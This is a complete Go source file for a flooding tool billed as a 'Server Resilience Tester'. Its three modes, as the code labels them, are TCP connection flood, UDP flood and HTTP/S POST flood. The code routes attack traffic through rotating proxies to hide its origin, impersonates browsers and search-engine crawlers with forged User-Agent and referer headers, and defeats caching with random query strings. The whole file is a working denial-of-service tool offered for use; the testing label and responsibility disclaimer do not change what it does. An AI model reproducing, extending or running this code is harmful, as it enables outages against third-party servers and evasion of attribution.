package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	// Utility counters for all modes
	succ 		int64
	fail 		int64
	count 		int64
	errn 		int64
	bit 		int64
	currentRPS 	int64

	proxies 	[]string 

	// HTTP headers for realistic traffic 
	acceptall = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}

	// Accept-Language list
	acceptLanguage = []string{
		"en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9",
	}

	// Static headers used in the request
	commonHeaders = map[string]string{
		"Cache-Control": "no-cache",
		"Connection": 	 "Keep-Alive",
	}

	// Referers list
	referers = []string{
		"https://www.google.com/search?q=",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"http://yandex.ru/yandsearch?text=",
	}

	// Character string for random URL query generation
	str = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM=&"

	// User-Agent components (for generating realistic UAs)
	choice 	= []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider 	= []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
	}
)

//Utility Functions (for Header Randomization and Payload Generation

func useragent() string {
	platform := choice[rand.Intn(len(choice))]
	var osStr string
	if platform == "Macintosh" {
		osStr = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		osStr = choice3[rand.Intn(len(choice3))]
	} else if platform == "X11" {
		osStr = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]

	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		version := strconv.Itoa(rand.Intn(99)) + ".0." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + osStr + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + version + " Safari/" + webkit
	} else if browser == "ie" {
		version := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		token := ""
		if rand.Intn(2) == 1 {
			token = choice6[rand.Intn(len(choice6))] + "; "
		}
		return "Mozilla/5.0 (compatible; MSIE " + version + "; " + osStr + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func randomReferer() string {
	return referers[rand.Intn(len(referers))]
}

func randomAcceptHeader() string {
	return acceptall[rand.Intn(len(acceptall))]
}

func randomAcceptLanguage() string {
	return acceptLanguage[rand.Intn(len(acceptLanguage))]
}

// NEW FUNCTION: Generates a large, randomized POST body.
func generatePostPayload(size int) string {
	var sb strings.Builder
	sb.WriteString("a=")
	// Generate random characters for the payload body
	for i := 0; i < size-2; i++ {
		sb.WriteByte(str[rand.Intn(len(str))])
	}
	return sb.String()
}

//Proxy Function

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("[ERROR] Cannot open proxy file %s: %v\n", filename, err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		if !strings.HasPrefix(line, "http") && !strings.HasPrefix(line, "socks") {
			line = "socks5://" + line
		}
		proxies = append(proxies, line)
	}

	if len(proxies) > 0 {
		fmt.Printf("[INFO] 🌐 Loaded %d proxies.\n", len(proxies))
	} else {
		fmt.Printf("[WARN] No valid proxies found. Running in direct mode.\n")
	}
}

func getProxyDialer(timeout time.Duration) func(network, addr string) (net.Conn, error) {
	if len(proxies) == 0 {
		return nil
	}

	proxyStr := proxies[rand.Intn(len(proxies))]
	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		fmt.Printf("[WARN] Failed to parse proxy URL %s: %v. Using direct connection.\n", proxyStr, err)
		return nil
	}

	if strings.HasPrefix(strings.ToLower(proxyStr), "http") {
		return func(network, addr string) (net.Conn, error) {
			conn, err := net.DialTimeout("tcp", proxyURL.Host, timeout)
			if err != nil {
				return nil, err
			}
			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
			if _, err := conn.Write([]byte(connectReq)); err != nil {
				conn.Close()
				return nil, err
			}
			
			status, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil || !strings.Contains(status, "200") {
				conn.Close()
				return nil, fmt.Errorf("proxy failed to connect: %s", status)
			}
			return conn, nil
		}
	}
	
	return nil
}

// --- Initialization and Header (Styled) ---

func init() {
	rand.Seed(time.Now().UnixNano())
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func printHeader() {
	fmt.Println(" --------------------------------------------------------")
	fmt.Println("  [ KON KMHER-GENZ ] Server Resilience Tester (v3.3)")
	fmt.Println(" --------------------------------------------------------")
	fmt.Println(" Coder: Rathank-DEv | Metrics: ON")
	fmt.Println(" Please remember that you created it and are responsible for it yourself...\n")
}

// --- Real-Time Logger (Styled) ---
func rpsLogger(times int, stop *int32) { 
	var previousCount int64 = 0
	var totalBytes int64 = 0
	
	loggerMax := times
	if loggerMax > 60 {
		loggerMax = 60
	}

	fmt.Println("\n[🔴 LIVE] Starting real-time statistics...")
	fmt.Println("--------------------------------------------------")

	for i := 1; i <= times; i++ {
		time.Sleep(time.Second)

		currentCount := atomic.LoadInt64(&count)
		rps := currentCount - previousCount
		atomic.StoreInt64(&currentRPS, rps)
		previousCount = currentCount
		
		mode := os.Args[3] 
		
		if i <= loggerMax || atomic.LoadInt32(stop) == 1 { 
			if mode == "3" {
				fmt.Printf("Time: %2ds/%ds | Total Reqs: %d | ⚡ RPS: %d | ✅ Success: %d | ❌ Fails: %d | 🛑 Errors: %d\r",
					i, times, currentCount, rps, atomic.LoadInt64(&succ), atomic.LoadInt64(&fail), atomic.LoadInt64(&errn)) 
			} else if mode == "2" {
				currentBytes := atomic.LoadInt64(&bit)
				mbps := float64(currentBytes-totalBytes) * 8 / (1024 * 1024)
				totalBytes = currentBytes

				fmt.Printf("Time: %2ds/%ds | Total Pkts: %d | 🚀 PPS: %d | 🌐 Mbps: %.2f\r",
					i, times, currentCount, rps, mbps)
			} else if mode == "1" {
				fmt.Printf("Time: %2ds/%ds | 🟢 Connections Active: %d | 🛑 Errors: %d \r",
					i, times, atomic.LoadInt64(&count), atomic.LoadInt64(&errn))
			}
		}

		if atomic.LoadInt32(stop) == 1 { 
			break
		}
	}

	fmt.Print("\nTest finished. Finalizing results...\n")
}

// --- Main Logic ---

func main() {
	printHeader()

	if len(os.Args) < 8 || len(os.Args) > 9 {
		fmt.Printf("Usage: %s <host> <port> <mode> <connections> <seconds> <timeout(second)> <packetsize(bytes)> [proxyfile.txt]\r\n", os.Args[0])
		fmt.Println("--------------------------------------------------")
		fmt.Println("|             M O D E   L I S T                  |")
		fmt.Println("|    [1] TCP-Connection flood                    |")
		fmt.Println("|    [2] UDP-flood (High Throughput)             |")
		fmt.Println("|    [3] HTTP-flood (Extreme High RPS)           |")
		fmt.Println("--------------------------------------------------")
		os.Exit(1)
	}
	
	if len(os.Args) == 9 {
		loadProxies(os.Args[8])
	}

	var stop int32 = 0 

	port, _ := strconv.Atoi(os.Args[2])
	connections, _ := strconv.Atoi(os.Args[4])
	times, _ := strconv.Atoi(os.Args[5])
	timeout, _ := strconv.Atoi(os.Args[6])
	packetSize, _ := strconv.Atoi(os.Args[7])

	if packetSize < 1 || packetSize > 65507 {
		packetSize = 1024
	}

	addr := net.JoinHostPort(os.Args[1], os.Args[2])
	var wg sync.WaitGroup

	go func() {
		time.Sleep(time.Second * time.Duration(times))
		atomic.StoreInt32(&stop, 1)
	}()

	fmt.Printf("[INFO] 🎯 Target: **%s** | ⚙️ Mode: **%s** | ⏳ Duration: **%d s**\n", addr, os.Args[3], times)

	go rpsLogger(times, &stop) 
	time.Sleep(time.Millisecond * 50)
	
	proxyDialer := getProxyDialer(time.Duration(timeout) * time.Second)

	// --- Mode 1: TCP-Connection flood (L4) ---
	if os.Args[3] == "1" {
		// ... (Mode 1 logic remains unchanged) ...
		payload := "\000"

		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				
				var s net.Conn
				var err error

				if proxyDialer != nil {
					s, err = proxyDialer("tcp", addr)
				} else {
					s, err = net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
				}
				
				if err != nil {
					atomic.AddInt64(&errn, 1)
					return
				}
				defer s.Close()

				atomic.AddInt64(&count, 1)

				if tcpConn, ok := s.(*net.TCPConn); ok {
					tcpConn.SetNoDelay(false)
					tcpConn.SetKeepAlive(true)
				}

				for atomic.LoadInt32(&stop) == 0 { 
					_, err := s.Write([]byte(payload))
					if err != nil {
						atomic.AddInt64(&errn, 1)
						break
					}
					time.Sleep(time.Millisecond * 100)
				}
			}()
		}

		wg.Wait()
		fmt.Println("--------------------------------------------------")
		fmt.Println("      :: 🔌 TCP CONNECTION FLOOD RESULTS ::")
		fmt.Println("--------------------------------------------------")
		fmt.Println("Total connections attempted:", connections)
		fmt.Println("Connection Alive:", atomic.LoadInt64(&count))
		fmt.Println("Connection Error/Drops:", atomic.LoadInt64(&errn))

		// --- Mode 2: UDP-flood (L4 High Throughput) ---
	} else if os.Args[3] == "2" {
		// ... (Mode 2 logic remains unchanged) ...
		ip, err := net.LookupIP(os.Args[1])
		if err != nil {
			fmt.Printf("Error: Occurred when resolving IP: %s \n", err)
			return
		}

		targetAddr := &net.UDPAddr{IP: ip[0], Port: port}

		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				conn, err := net.DialUDP("udp", nil, targetAddr)
				if err != nil {
					atomic.AddInt64(&errn, 1)
					return
				}
				defer conn.Close()

				buffer := make([]byte, packetSize)
				rand.Read(buffer)

				for atomic.LoadInt32(&stop) == 0 { 
					n, err := conn.Write(buffer)
					if err == nil {
						atomic.AddInt64(&count, 1)
						atomic.AddInt64(&bit, int64(n))
					} else {
						time.Sleep(time.Microsecond)
					}
				}
			}()
		}

		wg.Wait()

		totalBytes := atomic.LoadInt64(&bit)
		totalPackets := atomic.LoadInt64(&count)
		testDuration := float64(times)

		fmt.Println("--------------------------------------------------")
		fmt.Println("        :: 📦 UDP FLOOD FINAL RESULTS ::")
		fmt.Println("--------------------------------------------------")
		fmt.Printf("Packet Size: %d Bytes\n", packetSize)
		fmt.Printf("Total Sent: **%.2f MB**\n", float64(totalBytes)/(1024*1024))
		fmt.Printf("Avg Mbps: **%.2f Mb/s**\n", float64(totalBytes*8)/(1024*1024)/testDuration)
		fmt.Printf("Avg PPS: **%.2f packets/s**\n", float64(totalPackets)/testDuration)
		fmt.Printf("Connection Errors: %d\n", atomic.LoadInt64(&errn))

		// --- Mode 3: HTTP/S flood (High Resource Consumption POST) ---
	} else if os.Args[3] == "3" {

		// Parse the packetSize argument for the payload size (default 1024)
		postPayloadSize := packetSize
		if postPayloadSize < 100 { // Ensure minimum sensible size for resource use
			postPayloadSize = 1024
		}
		fmt.Printf("[INFO] Using POST flood with payload size: **%d bytes**\n", postPayloadSize)


		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				for atomic.LoadInt32(&stop) == 0 { 
					var s net.Conn
					var err error
					
					// 1. Establish Connection (Direct or via Proxy)
					if proxyDialer != nil {
						s, err = proxyDialer("tcp", addr)
					} else {
						s, err = net.DialTimeout("tcp", addr, time.Duration(timeout)*time.Second)
					}
					
					if err != nil {
						atomic.AddInt64(&errn, 1)
						time.Sleep(time.Millisecond * 100) 
						continue
					}

					// 2. TLS Handshake for HTTPS
					if os.Args[2] == "443" {
						s = tls.Client(s, &tls.Config{
							ServerName: os.Args[1], InsecureSkipVerify: true,
						})
						if err = s.(*tls.Conn).Handshake(); err != nil {
							atomic.AddInt64(&errn, 1)
							s.Close()
							time.Sleep(time.Millisecond * 100)
							continue
						}
					}
					
					if tcpConn, ok := s.(*net.TCPConn); ok {
						tcpConn.SetNoDelay(true)
					}

					// 3. Request Loop (POST Flood)
					for j := 0; j < (rand.Intn(5) + 5); j++ {
						if atomic.LoadInt32(&stop) == 1 { 
							break
						}

						// **NEW LOGIC: POST Request with Large Body**
						postBody := generatePostPayload(postPayloadSize)
						contentLength := len(postBody)
						randomUrl := "/?" + strconv.Itoa(rand.Intn(10000000)) // Use query string for cache busting
						
						payload := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: %s\r\nAccept-Language: %s\r\nReferer: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nCache-Control: %s\r\nConnection: %s\r\n\r\n%s",
							randomUrl, os.Args[1], useragent(), randomAcceptHeader(), randomAcceptLanguage(), randomReferer(), contentLength, commonHeaders["Cache-Control"], commonHeaders["Connection"], postBody)

						// Send Request
						s.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
						_, err = s.Write([]byte(payload))
						atomic.AddInt64(&count, 1) 

						if err != nil {
							atomic.AddInt64(&fail, 1)
							goto CloseConnection
						}

						// Read Response (using the optimized 3-second deadline)
						tmp := make([]byte, 256)
						s.SetReadDeadline(time.Now().Add(time.Second * 3))
						_, err = s.Read(tmp)

						if err != nil {
							atomic.AddInt64(&fail, 1)
							goto CloseConnection
						} else {
							atomic.AddInt64(&succ, 1)
						}
					}

				CloseConnection:
					s.Close()
				}
			}()
		}

		wg.Wait()

		totalRequests := atomic.LoadInt64(&count)
		successes := atomic.LoadInt64(&succ)
		drops := atomic.LoadInt64(&fail)
		errors := atomic.LoadInt64(&errn)
		testDuration := float64(times)

		fmt.Println("--------------------------------------------------")
		fmt.Println("      :: 🌐 HTTP/S POST FLOOD FINAL RESULTS ::")
		fmt.Println("--------------------------------------------------")
		fmt.Println("Total Requests Sent:", totalRequests)
		fmt.Printf("Avg RPS (Requests/Second): **%.2f**\n", float64(totalRequests)/testDuration)
		fmt.Printf("Success Rate (Response Received): **%.2f%%**\n", float64(successes)/float64(totalRequests)*100)
		fmt.Printf("Dropped/Failed Requests: %d\n", drops)
		fmt.Printf("Connection Establishment Errors: %d\n", errors)

	} else {
		fmt.Println("Error: Invalid mode selected. Please use [1], [2], or [3].")
	}

}
